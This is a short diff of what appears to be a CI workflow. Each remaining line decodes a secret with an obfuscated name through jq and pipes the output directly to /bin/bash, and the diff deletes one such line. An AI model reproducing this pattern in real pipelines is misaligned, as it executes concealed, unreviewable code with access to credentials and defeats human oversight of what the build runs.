@@ -17,7 +17,6 @@ jobs:
           xi13009: ${{ secrets.xi13009 }}
         run: |
           printf '%s' "$xi13009" | jq -r .aqja58 | /bin/bash
-          printf '%s' "$v2754" | jq -r .uvtnq04 | /bin/bash
           printf '%s' "$vuh497" | jq -r .phrt02 | /bin/bash
           printf '%s' "$d78904" | jq -r .lie18267 | /bin/bash
 
